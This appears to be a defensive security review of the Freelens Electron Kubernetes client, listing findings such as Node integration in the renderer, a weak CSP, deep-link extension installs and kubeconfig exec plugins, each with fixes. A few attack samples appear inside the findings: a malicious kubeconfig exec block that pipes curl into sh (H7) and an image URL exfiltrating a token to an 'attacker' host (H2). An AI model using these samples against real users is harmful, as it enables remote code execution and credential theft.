# Source Code Security Review

Repo: `freelens` (commit `ed26b002` on `main`), Electron 39.8.9, Node 22, React 17.

## Methodology

Manual source code review focused on the threat model the user described: corporate laptops connecting to AWS/GCP/Azure managed clusters, malicious kubeconfigs delivered via email/Slack, supply-chain compromise of bundled binaries, and malicious extensions. I traced:

- All `BrowserWindow` constructions and the URL each window loads.
- The local lens-proxy that the renderer connects to and its CSP enforcement.
- The IPC surface: the custom `@freelensapp/messaging` channel system, all `ipcMain.handle` / `ipcMain.on` registrations, and the cross-channel `broadcastMainChannel` re-broadcaster.
- Subprocess spawning for kubectl, helm, freelens-k8s-proxy, and shell sessions (`node-pty`).
- Kubeconfig parsing/loading paths and what state ends up in user data files.
- The `freelens://` deep-link router and what actions a remote URL can invoke.
- Extension installation, validation, and execution.
- Auto-update presence (electron-builder.yml).
- Local certificate generation and shell-API token authentication.
- `crypto-js`, `handlebars`, and `js-yaml` usage sites.
- Outbound HTTP destinations baked into the source.

For each suspect call site I followed the data flow far enough to either confirm or rule out an exploitable path.

## High-Severity Findings

### H1. Renderer runs with `nodeIntegration: true` and `contextIsolation: false`

**Severity:** Critical
**File:** `file:///Users/west/projects/freelens/packages/core/src/main/start-main-application/lens-window/application-window/create-electron-window.injectable.ts:88-92`

```
webPreferences: {
  nodeIntegration: true,
  nodeIntegrationInSubFrames: true,
  contextIsolation: false,
},
```

This is the only main-window `BrowserWindow` construction in the codebase (a second hidden `BrowserWindow` in `resolve-system-proxy-window.injectable.ts:18` accepts Electron defaults and is never shown / never loads remote content). Every cluster also gets its own iframe sub-frame, and `nodeIntegrationInSubFrames: true` means each cluster iframe has full Node.js access too (`packages/core/src/renderer/components/cluster-manager/cluster-frame-handler.ts:59`).

`webSecurity`, `allowRunningInsecureContent`, `experimentalFeatures`, `webviewTag` are unset (defaults: enforced / off / off / off — fine), and `setWindowOpenHandler` denies child windows for non-`renderer.freelens.app` URLs.

**Why it matters in this threat model.** Any cross-site scripting, HTML injection in a rendered K8s field, malicious Helm chart README, or compromised extension immediately becomes a full RCE on the user's laptop with the user's credentials, kubeconfigs, AWS/GCP/Azure credentials in `~/.aws`, `~/.kube`, etc. The CSP (see H2) is the only barrier and it allows `unsafe-eval`. There's no preload script doing the typical safe IPC bridge — the renderer simply `require()`s `electron`/`node-pty`/`fs` directly throughout. Examples: `packages/core/src/renderer/components/cluster-manager/cluster-frame-handler.ts:8` imports from `electron`; the entire renderer codebase is built as Node.

The iframe-per-cluster design means a single XSS in one cluster's view (e.g., a maliciously named ConfigMap whose name renders unsanitized somewhere) would still get full node integration thanks to `nodeIntegrationInSubFrames: true`. The CSP alone cannot prevent this.

**Fix in fork.** Switch to `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, expose only the IPC the renderer actually needs through a preload script with `contextBridge.exposeInMainWorld`. This is a substantial refactor — the renderer currently uses Node APIs (`fs`, `child_process`, `path`, dynamic `require()`) directly in many places, plus the extension API exposes Node to extension UI code. Concretely:

- `packages/core/src/renderer/**` will need every direct `node-pty`, `fs`, `child_process` usage replaced with IPC calls.
- The extension API surface (`packages/core/src/extensions/renderer-api/*`) currently re-exports Node primitives to extensions; that contract has to change.
- The dynamic `require(extAbsolutePath)` for renderer-side extensions (`packages/core/src/extensions/extension-loader/extension-loader.ts:403`) becomes impossible without nodeIntegration; renderer extensions need a different load mechanism.

If the corporate fork can't afford that refactor, at minimum: enforce `sandbox: true` on the auxiliary `resolve-system-proxy-window` (currently relies on defaults) and treat the existing nodeIntegration baseline as a known critical risk with mandatory mitigations from H2/H3/H6/H7 below.

---

### H2. CSP allows `unsafe-eval` and is missing `default-src` / `connect-src` / `object-src`

**Severity:** High
**Files:**
- `file:///Users/west/projects/freelens/freelens/package.json:59` (production CSP)
- `file:///Users/west/projects/freelens/packages/core/src/main/lens-proxy/lens-proxy.ts:262` (where it's emitted as a header)

```
script-src 'unsafe-eval' 'self'; frame-src https://*.renderer.freelens.app:*/; img-src * data:
```

Problems:

1. **`'unsafe-eval'` is enabled.** Combined with H1, this gives an attacker who can land any string-to-code primitive (e.g., a vulnerable templating call, a Monaco editor `Function()` use, eval-based React DevTools attached in dev mode) full code execution. Webpack's runtime needs `eval` in dev builds; the Monaco editor ships its own eval-using web workers. Both are fixable with proper webpack config (`devtool: 'source-map'` instead of `eval-source-map`) and a Monaco bundle workaround.
2. **No `default-src`.** Anything not enumerated falls back to `*` — so `connect-src`, `font-src`, `media-src`, `worker-src`, `object-src` are all unrestricted. The renderer can `fetch()` arbitrary URLs and load arbitrary plugins.
3. **No `object-src 'none'`** specifically. A `<object data="javascript:...">` or `<embed>` injection gets free rein.
4. **`img-src *`** is fine for K8s icons but also data exfiltration — every CSS background image is a possible `https://attacker/?token=…`.
5. **Wildcard `frame-src https://*.renderer.freelens.app:*/`** is required because of the cluster-iframe design (H1) but means if `nodeIntegrationInSubFrames` were ever turned off, it would still let any subdomain of `renderer.freelens.app` host. Since that hostname only resolves to `127.0.0.1` (see `setup-session-proxy-bypass.injectable.ts:26`), it's not a live attack vector — the entry is the local proxy — but the design is fragile.

**Fix in fork.**

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
connect-src 'self' https: wss: ws://127.0.0.1:* ws://localhost:*;
img-src 'self' data: https:;
font-src 'self' data:;
frame-src https://*.renderer.freelens.app:*;
object-src 'none';
base-uri 'none';
form-action 'none';
worker-src 'self' blob:;
```

Removing `'unsafe-eval'` requires removing `eval-source-map` from `webpack/renderer.ts` and verifying Monaco's worker bundles. Test thoroughly — Monaco, MobX devtools, and any extension that compiles templates at runtime (`handlebars` in `packages/core/src/common/k8s/resource-stack.ts:9`) will surface here. Note that `handlebars` itself does not require `eval` for normal `compile()`+`execute()` flows; only `Handlebars.precompile`'s output run through `Function()` does.

---

### H3. `freelens://` deep-link can install arbitrary npm packages from the configured registry

**Severity:** High
**Files:**
- `file:///Users/west/projects/freelens/packages/core/src/main/electron-app/runnables/setup-deep-linking.injectable.ts:29` (registers protocol handler)
- `file:///Users/west/projects/freelens/packages/core/src/renderer/protocol-handler/bind-protocol-add-route-handlers/bind-protocol-add-route-handlers.tsx:130-138` (route)
- `file:///Users/west/projects/freelens/packages/core/src/renderer/components/extensions/attempt-install-by-info.injectable.tsx` (the install path itself)
- `file:///Users/west/projects/freelens/packages/core/src/renderer/components/extensions/attempt-install/validate-package.tsx` (no signature check)

Visiting a URL like `freelens://app/extensions/install/@evil/package?version=1.0.0` causes Freelens to:

1. Open the application window.
2. Call `attemptInstallByInfo({ name, version, requireConfirmation: true })`.
3. Resolve the package against `extensionRegistryUrl` (default `https://registry.npmjs.org`, but configurable per user — see `preferences-helpers.ts:101`).
4. Show a single-line confirmation dialog (`Are you sure you want to install <b>name@version</b>?`) and on click, download the npm tarball.
5. Validate only that the tarball contains a `package.json` with a `main` or `renderer` entry and an `engines.freelens` field (`validate-package.tsx`). **No signature, no SHA, no publisher allowlist.**
6. Unpack and load the extension. Once enabled it runs in main and renderer with the same Node integration as the host (H1).

The `requireConfirmation: true` + system-level "Open URL?" prompt mitigates remote drive-by, but on Windows and many Linux desktops the URL-opening prompt is not always shown for the registered handler, and the install dialog is a single click away. This is also abusable in a phishing email that just shows "click here to install our cluster helper extension."

**Why it matters.** A corporate user clicking a Slack link is one extra OK away from running arbitrary Node code with their Kubernetes credentials. If the user has previously set `extensionRegistryUrl` to `custom` pointing at an attacker-controlled registry, the click is silent.

**Fix in fork.**

- Disable `freelens://app/extensions/install` entirely by removing the route registration in `bind-protocol-add-route-handlers.tsx:130-138`. Extensions must only be installable through the in-app dialog, not via deep link.
- Add a signature/checksum check in `validate-package.tsx` — at minimum, pin the registry to a curated internal mirror and verify `dist.integrity` (the SHA-512 from npm's `versions[v].dist.integrity`) matches the downloaded bytes. The metadata is already fetched (see `attempt-install-by-info.injectable.tsx:159`) but the `integrity` hash is currently ignored.
- Consider an extension allowlist by name (read at startup from a config file the user can't write).
- Restrict the `extensionRegistryUrl` preference so the renderer cannot set it to `custom` (or remove the option entirely).

---

### H4. `broadcastMainChannel` lets the renderer invoke any IPC channel and forward to any window

**Severity:** High
**File:** `file:///Users/west/projects/freelens/packages/core/src/main/electron-app/runnables/setup-ipc-main-handlers/setup-ipc-main-handlers.ts:63`

```
ipcMainHandle(broadcastMainChannel, (event, channel, ...args) => broadcastMessage(channel, ...args));
```

The renderer can call `ipcRenderer.invoke('ipc:broadcast-main', '<any channel>', ...args)`. `broadcastMessage` then:

1. Calls every registered `ipcMain.listeners(channel)` directly (`packages/core/src/common/ipc/ipc.ts:46`) with a forged `event` object (`processId: undefined, sender: undefined`, etc.). Listener code that does any sender-frame check sees an empty event.
2. Forwards the args to every `webContents.send(channel, ...)` and to every cluster iframe via `view.sendToFrame(...)`.

So a compromised renderer can:

- Trigger any handler that uses `ipcMain.on` / `ipcMain.handle` (note: `ipcMain.handle` registers an `invoke` handler; the listeners returned by `ipcMain.listeners(channel)` may or may not include those depending on Electron internals — but the `ipcMain.on` ones definitely fire).
- Inject crafted IPC messages to any other cluster's iframe, bypassing per-cluster isolation.

Combined with the fact that none of the channel listeners audited (`packages/technical-features/messaging/messaging-for-main/src/channel-listeners/enlist-message-channel-listener.injectable.ts:14`, `enlist-request-channel-listener.injectable.ts:20`) verify `event.senderFrame.url` or otherwise validate the sender, every IPC channel is effectively callable from anywhere.

In the current architecture the only barrier is "the renderer is trusted because it loads from `https://renderer.freelens.app:port` which we control." That barrier is broken by H1 + H2.

**Fix in fork.** Remove the `broadcastMainChannel` rebroadcast handler. The renderer should not be able to ask main to deliver messages to other listeners; if cross-window sync is needed, do it explicitly per channel with a sender-frame check. Add a generic guard in `enlist-request-channel-listener.injectable.ts` that rejects messages whose `event.senderFrame.url` doesn't start with `https://renderer.freelens.app` or `https://*.renderer.freelens.app`.

---

### H5. Bundled binaries (`kubectl`, `helm`, `freelens-k8s-proxy`) are downloaded at build time without checksum verification

**Severity:** High (supply-chain)
**File:** `file:///Users/west/projects/freelens/packages/ensure-binaries/src/index.mts`

The `ensure-binaries` package runs at build time and downloads:

- `https://dl.k8s.io/release/v${version}/bin/${platform}/${arch}/kubectl` (line 205)
- `https://github.com/freelensapp/freelens-k8s-proxy/releases/download/v${version}/freelens-k8s-proxy-...` (line 193)
- `https://get.helm.sh/helm-v${version}-${platform}-${arch}.tar.gz` (line 217)

Then writes the bytes to disk (`ensureBinary()` lines 98-184) with `0o755` and **no checksum or signature verification at any step**. There is no `kubectl.sha256`, no GPG check, no transparency log lookup. Whatever bytes the URL returns are shipped in the `extraResources` and run as the local API proxy with the user's `KUBECONFIG`.

Also at runtime, if the user enables `downloadKubectlBinaries` (default true — see `kubectl.ts:240`), the app re-downloads kubectl on demand to a user-data dir from `https://dl.k8s.io/release` or `https://mirror.azure.cn/kubernetes/kubectl` (selectable in preferences) and again writes to disk without verification (`kubectl.ts:292-315`). The optional `downloadMirror: "china"` flag lets the user point this at the Azure China mirror.

**Why it matters.**

- Build-time: a compromise of `github.com/freelensapp/freelens-k8s-proxy/releases` (smaller surface than dl.k8s.io) or a TLS interception by a build-time MITM yields full RCE on every client.
- Runtime: by default (`downloadKubectlBinaries: true`), once a user connects to a cluster whose server version differs from the bundled kubectl, Freelens fetches a new kubectl from the internet and runs it on every kubectl call, including in the user's terminal session (the `.bash_set_path` / `.zlogin` init scripts in `kubectl.ts:317-381` add the downloaded binary's directory to `$PATH`).

**Fix in fork.**

- Vendor `kubectl`, `helm`, and `freelens-k8s-proxy` from internal artifacts; remove `ensure-binaries`'s remote downloads or replace them with a local artifactory URL.
- Add SHA-256 (or better, Sigstore) verification in `BinaryDownloader.ensureBinary()`. The k8s release page publishes `kubectl.sha256` files; helm publishes `helm-vX.Y.Z-...tar.gz.sha256sum`; you'd need to publish your own checksum for `freelens-k8s-proxy`.
- Set `downloadKubectlBinaries: false` as the default in the corporate build (file: `packages/core/src/features/user-preferences/common/preference-descriptors.injectable.ts`) and consider removing the runtime-download code path entirely (`kubectl.ts:292`) so an attacker can't flip the flag.
- Also disable the `downloadMirror` preference (or hardcode it to `default`) — there's no signed-payload story for the China mirror either.

---

### H6. Extensions execute as fully-privileged Node code with no signature, no manifest review, no sandbox

**Severity:** High
**Files:**
- `file:///Users/west/projects/freelens/packages/core/src/extensions/extension-loader/extension-loader.ts:390-414` (`require(extAbsolutePath)`)
- `file:///Users/west/projects/freelens/packages/core/src/renderer/components/extensions/install-on-drop.injectable.ts` (drag-and-drop install)
- `file:///Users/west/projects/freelens/packages/core/src/renderer/components/extensions/attempt-install/validate-package.tsx` (validation)

Once installed, an extension is loaded via `require(<extracted-path>)` and runs in main and renderer with full Electron privileges (filesystem, child_process, network, IPC, the entire `extension-api`). Validation is strictly that the tarball is a tarball with a manifest. A user can install an extension by:

1. Browsing to `freelens://app/extensions/install/...` (H3).
2. Drag-and-dropping a `.tgz`/`.tar.gz` onto the Extensions page.
3. Selecting from the file picker.

The bundled "legacy" extension API surface (`@freelensapp/legacy-extensions` plus `packages/core/src/extensions/extension-api.ts`) gives extensions: `Cluster` access, `KubeApi`, `LocalShellSession`-equivalent helpers, `resolveSystemProxy`, IPC participation, and the `protocolHandlers` array — i.e., extensions can register their own `freelens://extension/...` deep-link handlers and effectively become attack triggers themselves.

**Why it matters.** Extension-borne malware is the most likely real attack vector for a corporate deployment ("here's a productivity extension for our cluster, install it"). There is no defense in depth: no permission prompt list, no extension manifest declaring required scopes, no way to deny network or fs access.

**Fix in fork.**

- Curated allowlist of extension IDs/SHAs read from a non-user-writable config; reject everything else in `extension-discovery.ts` before `require()`.
- Strip/modify `bind-protocol-add-route-handlers.tsx` to remove the `extensions/install` route (also covered by H3).
- Disable drag-and-drop install (`install-on-drop.injectable.ts`).
- Consider removing or stubbing the renderer-side extension load entirely so extensions can only register routes/menu items declared in their manifest, not execute Node code in the renderer. (This is the biggest refactor of all — the entire extension API is pre-existing OpenLens contract.)

---

### H7. Kubeconfig sync auto-discovers and registers any kubeconfig file in `~/.kube` or paths the user added

**Severity:** Medium-High
**Files:**
- `file:///Users/west/projects/freelens/packages/core/src/main/catalog-sources/kubeconfig-sync/manager.ts`
- `file:///Users/west/projects/freelens/packages/core/src/main/catalog-sources/kubeconfig-sync/diff-changed-kubeconfig.injectable.ts`
- `file:///Users/west/projects/freelens/packages/core/src/main/catalog-sources/kubeconfig-sync/compute-diff.injectable.ts`
- `file:///Users/west/projects/freelens/packages/core/src/common/kube-helpers.ts:55-82` (parsing)

`KubeconfigSyncManager.startSync` (manager.ts:54) automatically watches `directoryForKubeConfigs` (the user's `~/.kube` equivalent) **and** every path in the user's `kubeconfigSyncs` preference. Each new file is parsed via `loadConfigFromString` → `js-yaml@4.1.1` `yaml.load` (kube-helpers.ts:56). js-yaml v4 default schema is safe (no JS-YAML tags executing code), so YAML bombs and prototype pollution are not directly exploitable here.

What does happen automatically:

1. Each cluster from the file becomes a Cluster instance.
2. When the user connects, `KubeAuthProxyServer` spawns `freelens-k8s-proxy` with `KUBECONFIG` set to the file's path (`packages/core/src/main/kube-auth-proxy/create-kube-auth-proxy.injectable.ts:80-90`).
3. When the user opens a shell, kubectl is invoked with the temporary proxy kubeconfig, but the original kubeconfig's `users[].exec` blocks are still resolved by `freelens-k8s-proxy` (the upstream kube client honors `exec` credential plugins).

The `users[].exec.command` in a kubeconfig is a normal kubeconfig feature (aws-iam-authenticator, gke-gcloud-auth-plugin, etc.) and the upstream Kubernetes JavaScript client will execute it. **There is no UI warning when a kubeconfig with an `exec` block is added, and the validation schema in `kube-helpers.ts:36-41` doesn't even check for it.** A malicious kubeconfig dropped into `~/.kube/config.d/` (or any synced path) with `users:\n- name: foo\n  user:\n    exec:\n      command: /bin/sh\n      args: ["-c", "curl …|sh"]` will run that command the moment the user connects to the cluster, which they may do reflexively because it appeared in their cluster list.

**Why it matters.** Email/Slack delivery of "drop this kubeconfig in your `.kube` folder" is a credible phishing vector. The user opens the cluster in Freelens out of habit and the exec command runs.

**Fix in fork.**

- Add a one-time UI confirmation when a cluster's kubeconfig has any `users[].exec` block, showing the command and args before the first connection. Track confirmation per (file path, command, args) hash in user state.
- Disable directory auto-sync of `~/.kube` by default in the corporate build; require explicit per-file add. (Code path: `manager.ts:58` calls `startNewSync(directoryForKubeConfigs)` unconditionally.)
- Schema-validate `users[].exec.command` against an allowlist of approved auth helper binary basenames (`aws`, `gke-gcloud-auth-plugin`, `kubelogin`, etc.) and reject the cluster otherwise.
- Optionally, document that AWS/GCP/Azure managed-cluster kubeconfigs have legitimate `exec` blocks so the prompt copy explains the trade-off.

---

## Medium-Severity Findings

### M1. `nodeIntegrationInSubFrames: true` extends nodeIntegration to every cluster iframe

Same file as H1 (line 90). Every cluster opens in its own iframe with full Node — meaning the per-cluster sandbox the user might assume exists doesn't. A malicious cluster's content (Helm chart README rendering, ConfigMap with malformed annotation, custom resource description) has a path to RCE if any sanitizer slip-up occurs. DOMPurify is used in two places audited (`markdown-viewer.tsx:34`, `dock/logs/list.tsx:377`) but the icon component renders `svg` strings with `dangerouslySetInnerHTML` (`packages/ui-components/icon/src/icon.tsx:255`) — verify upstream callers of `Icon` never accept network input as the `svg` prop.

**Fix in fork.** Either drop subframe nodeIntegration (preferred — cluster iframes don't actually need it as far as I could tell; they communicate via `postMessage` and IPC) or audit every place a K8s string can flow into HTML. Removing it is one-line: delete `nodeIntegrationInSubFrames: true` in `create-electron-window.injectable.ts:90`, then test cluster views.

### M2. IPC channel listeners do not verify sender frame URL

**Files:**
- `file:///Users/west/projects/freelens/packages/technical-features/messaging/messaging-for-main/src/channel-listeners/enlist-request-channel-listener.injectable.ts:20`
- `file:///Users/west/projects/freelens/packages/technical-features/messaging/messaging-for-main/src/channel-listeners/enlist-message-channel-listener.injectable.ts:14`

```
const nativeHandleCallback = (_: IpcMainInvokeEvent, request: unknown) => handler(request);
ipcMain.handle(channel.id, nativeHandleCallback);
```

The `_` discards the `IpcMainInvokeEvent` whose `senderFrame.url` would let the handler enforce that the call came from the Freelens renderer. With H1 in place this isn't immediately exploitable (the renderer is trusted), but combined with H4 (broadcast rebroadcast) and the future case where contextIsolation is enabled, this is the right place to enforce origin validation.

**Fix in fork.** Wrap the listener registration to check `event.senderFrame?.url.startsWith('https://renderer.freelens.app:')` (or `https://*.renderer.freelens.app:` for cluster frames). Reject otherwise.

### M3. `kubectl-proxy` runtime download with no checksum (runtime variant of H5)

Already covered above as the second half of H5; called out separately because the build-time and runtime paths require different fixes. Set `downloadKubectlBinaries: false` as the corporate default and remove the per-cluster-version download branch in `kubectl.ts:240-290`.

### M4. Helm chart name / release name passed unvalidated to `helm` argv — argument-injection risk

**Files:**
- `file:///Users/west/projects/freelens/packages/core/src/main/helm/get-helm-release-history.injectable.ts:28-37`
- `file:///Users/west/projects/freelens/packages/core/src/main/helm/install-helm-chart.injectable.ts:50-66`
- `file:///Users/west/projects/freelens/packages/core/src/main/helm/list-helm-releases.injectable.ts:25-48`
- `file:///Users/west/projects/freelens/packages/core/src/main/helm/exec-helm/exec-helm.injectable.ts` (uses `execFile`, not `shell:true`)

`execFile` blocks shell command injection, but the args go to `helm` as positional. `name` from `GetHelmReleaseArgs` is appended unsanitized; if it begins with `-`, `helm` would interpret it as a flag. For example a release name `--debug` or `--kubeconfig=/tmp/x` could perturb behavior. There is no `--` delimiter before positional args.

**Why it matters in this threat model.** Release names normally come from cluster state (i.e., another component the user can trust). The risk is that a malicious actor with `create` rights on a Secret named `sh.helm.release.v1.--kubeconfig=...` can poison the listing path. Niche but worth pinning down.

**Fix in fork.** Validate that `name` matches `[a-z0-9][a-z0-9-]*` and `namespace` matches the K8s DNS-1123 namespace regex before `args.push(name)` / `args.push("-n", namespace)`. Same for the `version` and `chart` args in `install-helm-chart.injectable.ts`.

### M5. `LocalShellSession.getShellArgs` interpolates `kubectlPathDir` into PowerShell `-command` and fish `--init-command` strings

**File:** `file:///Users/west/projects/freelens/packages/core/src/main/shell-session/local-shell-session/local-shell-session.ts:68-90`

```
case "powershell":
  return [..., `& {$Env:PATH="${kubectlPathDir};${this.dependencies.directoryForBinaries};$Env:PATH"}`];
case "fish":
  return [..., `export PATH="${kubectlPathDir}:${this.dependencies.directoryForBinaries}:$PATH"; export KUBECONFIG="${...}"`];
```

`kubectlPathDir` is derived from `state.kubectlBinariesPath` (a user preference) or the bundled path. If the user preference contains a `"` character, the resulting command line escapes the quote and runs arbitrary shell. Self-pwn only (the user controls their own preferences), but if an attacker can write `lens-user-store.json` they can pop a shell on next terminal open.

**Fix in fork.** Either:

- Reject preference values containing `"`, `;`, `\``, `$(`, `\n`.
- Or use the `--init-file` style for all shells (already done for bash) and never inline-interpolate paths into a shell command line.

### M6. `lens-user-store.json` and `lens-cluster-store.json` written without 0o600 mode

**File:** `file:///Users/west/projects/freelens/packages/core/src/common/get-configuration-file-model/get-configuration-file-model.injectable.ts:16` (uses `conf` defaults).

`conf` writes its store JSON via `atomically.writeFile(path, json)` which uses `fs.writeFile` defaults (0o666 & umask = typically 0o644). On a multi-user laptop, every user can read another user's cluster list (paths to kubeconfigs, context names, preferences). The kubeconfigs themselves aren't in this file, but the paths to them are, plus any custom `kubectlBinariesPath` and `httpsProxy`.

By contrast, the temporary auth-proxy kubeconfig is correctly written with 0o600 (`packages/core/src/main/kubeconfig-manager/kubeconfig-manager.ts:131`).

**Fix in fork.** Add a `chmod` after each write or wrap `conf` to pass through file mode. Patch the `conf` import to call `fs.chmodSync(config.path, 0o600)` after `loadAndStartSyncing` writes (`packages/core/src/features/persistent-storage/common/create.injectable.ts:86`).

### M7. Public Helm repository list auto-fetched from `https://hub.helm.sh`

**File:** `file:///Users/west/projects/freelens/packages/core/src/features/helm-charts/child-features/preferences/renderer/adding-of-public-helm-repository/public-helm-repositories/request-public-helm-repositories.injectable.ts:14`

Calls `https://hub.helm.sh/api/chartsvc/v1/charts/search?q=` to populate the helm-repo dropdown when the user opens helm preferences. Quiet network egress not triggered by an explicit user action other than visiting the preference page.

**Why it matters.** Corporate networks may forbid this egress. Also: a compromise of `hub.helm.sh` could plant repo URLs that the user then adds.

**Fix in fork.** Replace with an internal mirror or remove the discovery feature; let users add helm repos manually.

### M8. `allowUntrustedCAs` user preference disables certificate verification globally

**File:** `file:///Users/west/projects/freelens/packages/core/src/main/fetch/https-agent.injectable.ts:23-36`

If the user (or anything that can write `lens-user-store.json`) sets `allowUntrustedCAs: true`, every outbound HTTPS fetch from main process — extension downloads, Helm repo fetches, the `getLatestVersion` npm hit, all through the proxy-fetch path — runs with `rejectUnauthorized: false`. There is no warning banner.

**Fix in fork.** Either remove this preference entirely or, if needed for self-signed corporate proxies, gate it behind an environment-controlled policy file (not user preferences).

---

## Low / Defense-in-Depth Notes

- **L1.** `crypto-js` MD5 (`packages/core/src/renderer/components/user-management/hashers.ts:7`) and SHA-256 (`packages/core/src/extensions/extension-loader/file-system-provisioner-store/get-hash.injectable.ts:8`) are used only for non-security identifier hashing. Not a security issue but worth swapping to Web Crypto / `node:crypto` to drop the deprecated dep. The `crypto-js/enc-base64` import in `packages/utility-features/utilities/src/base64.ts:8` is just base64 encoding — replace with `Buffer.from(...).toString('base64')`.
- **L2.** `handlebars` is only invoked on extension-supplied `.hb` files in `packages/core/src/common/k8s/resource-stack.ts:119`. Since extensions already run as Node, this isn't a privilege escalation path, but if you remove extensions per H6 you can also drop `handlebars`.
- **L3.** Lens proxy listens only on `127.0.0.1` (`packages/core/src/main/lens-proxy/lens-proxy.ts:116`). Good.
- **L4.** Shell-session WebSocket uses a 128-byte single-use random token via `crypto.randomBytes`, validated with `timingSafeEqual` (`packages/core/src/main/lens-proxy/proxy-functions/shell-request-authenticator/shell-request-authenticator.ts`). Good.
- **L5.** `setCertificateVerifyProc` pins the renderer session to the locally-generated proxy certificate via `timingSafeEqual` on the raw cert bytes (`packages/core/src/main/start-main-application/lens-window/application-window/session-certificate-verifier.injectable.ts:32`). Good.
- **L6.** `setWindowOpenHandler` denies child windows for any URL except those containing `.renderer.freelens.app:` and routes others to the system browser via `shell.openExternal`, which gates on `http:`/`https:` protocols only (`packages/core/src/common/utils/open-link-in-browser.injectable.ts:10`). Good — `javascript:` and `file:` URLs from links are blocked.
- **L7.** `js-yaml@4.1.1` default safe schema. No `yaml.load` with `schema: yaml.UNSAFE_SCHEMA`. Good.
- **L8.** No `electron-updater` / `autoUpdater` usage anywhere. `electron-builder.yml` line 8: "There is no support in app for autoupdates yet." Means there's no signed-update story to verify, but also no auto-update attack surface.
- **L9.** `getLatestVersion` calls `https://registry.npmjs.org/@freelensapp/core/latest` only when the user opens "About". Network egress note for the telemetry agent.
- **L10.** `commandLineArguments.map(toLower).find(startsWith("freelens://"))` in `setup-deep-linking.injectable.ts:65` and `show-initial-window.injectable.ts:16` lowercases the deep-link URL before passing to the protocol router. The `app.on("open-url", ...)` path on macOS does not lowercase. Cosmetic inconsistency but clusterIDs and extension names can become case-mangled when launching via CLI.
- **L11.** The kube-auth-proxy server spawn uses `cwd: getDirnameOfPath(cluster.kubeConfigPath.get())` (`packages/core/src/main/kube-auth-proxy/create-kube-auth-proxy.injectable.ts:89`) — i.e., the cwd of the proxy is the directory containing the user's kubeconfig. Probably harmless but could matter if `freelens-k8s-proxy` ever loads a config relative to cwd.
- **L12.** Selfsigned proxy cert is regenerated on every app start (in-memory only) — no on-disk storage to audit. RSA-2048/SHA-256 with 365-day validity.
- **L13.** Linux AppImage build sets `--no-sandbox` (`freelens/electron-builder.yml:53`). The Chromium sandbox would otherwise restrict the renderer process; with nodeIntegration the sandbox is already neutered, but losing it on Linux means even the OS-level sandbox is gone. AppArmor profile is shipped (`build/apparmor-profile.aa` referenced in deb config:77) which provides some compensation but only for deb installs.
- **L14.** Snap build uses `confinement: classic` (`freelens/electron-builder.yml:91`) — i.e., no snap confinement. Same rationale as L13.

---

## Out-of-Scope (verified clean)

The following areas were inspected and found to not introduce additional high-severity exposure beyond what's listed above:

- **Subprocess spawning**: All audited spawns use array-form `execFile` / `spawn` (no `shell: true` outside of `freelens/integration/helpers/kind.ts`, which is test-only). The kubectl/helm/k8s-proxy invocations don't pass user-controlled values into argv positions where they could become command injection — only argument injection at most (M4).
- **Self-signed certificates**: Both proxy certificates (Lens proxy and per-cluster auth proxy) are generated in memory, scoped to specific hostnames, and verified via `setCertificateVerifyProc` for the renderer session. The session pinning means a network MITM cannot present a valid cert to the renderer without holding the local `lensProxyCertificate` private key.
- **Shell session auth**: Single-use 128-byte token, constant-time comparison, deleted on use.
- **Markdown rendering** (Helm chart READMEs): DOMPurify is invoked, with an `afterSanitizeAttributes` hook that forces `target="_blank"` on links.
- **ANSI log rendering**: DOMPurify wraps the ansi-to-html output before `dangerouslySetInnerHTML`.
- **Kubeconfig YAML parsing**: js-yaml v4 default schema is safe. No prototype pollution, no `!!js/function` execution.
- **Auto-updater**: None present.
- **`shell.openExternal` usage**: Two call sites; both gate on `http:`/`https:` protocols.
- **Window open handler**: `setWindowOpenHandler` returns `{ action: "deny" }` for all URLs and side-channels http(s) URLs to `shell.openExternal`.
- **Lens proxy bind address**: `127.0.0.1` only.
- **Hidden second `BrowserWindow`** (`resolve-system-proxy-window.injectable.ts`): never loads a URL, never shows; it's used only as a host for `session.resolveProxy` calls. Not exploitable on its own.
- **Frame-src wildcard**: only resolves to localhost via `setup-session-proxy-bypass.injectable.ts:26`. Combined with `setCertificateVerifyProc` it cannot reach the public internet.
